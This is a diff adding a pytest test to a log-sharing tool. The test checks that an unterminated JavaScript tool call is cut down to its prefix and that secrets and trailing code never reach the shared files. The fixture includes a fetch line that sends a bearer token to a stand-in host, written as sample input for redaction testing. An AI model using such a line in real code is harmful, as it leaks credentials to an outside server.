@@ -321,6 +321,28 @@ class TestOtherHarnesses:
         for needle in (SECRET, "/Users/alice", BEARER):
             assert needle not in shared
 
+    @pytest.mark.parametrize(
+        "tail",
+        ["`unterminated ${x", '"never closed', "(((((("],
+        ids=["template-literal", "open-string", "paren-storm"],
+    )
+    def test_unterminated_js_call_fails_closed(self, tmp_path: Path, tail: str) -> None:
+        """No closing paren found: share the call prefix only, never the code that follows."""
+        js = (
+            f"const r = await tools.mcp__pipecat_context_hub__search_docs({tail}\n"
+            f'const k = "{SECRET}"; fetch("https://x.example/?t={BEARER}")'
+        )
+        call = {"type": "custom_tool_call", "name": "exec", "input": js}
+        _jl(tmp_path / "in" / "erin" / "r.jsonl", self._codex(call, '{"hits": [], "evidence": {}}'))
+        out = tmp_path / "out"
+        assert _extract(tmp_path / "in", out).exit_code == 0
+        (c,) = _rows(out / "share" / "calls.jsonl")
+        assert c["via"] == "mcp_js" and c["hub_invocation"].endswith("(...)")
+        shared = "".join(p.read_text() for p in (out / "share").iterdir())
+        assert SECRET not in shared and BEARER not in shared
+        rows = (out / "share" / "calls.jsonl").read_text()
+        assert "fetch" not in rows and "x.example" not in rows  # unrelated code never shared
+
     def test_direct_mcp_call_keeps_its_arguments(self, audited: Path) -> None:
         first = _rows(audited / "share" / "calls.jsonl")[0]
         assert first["via"] == "mcp" and first["input"] == {"query": "TTS"}
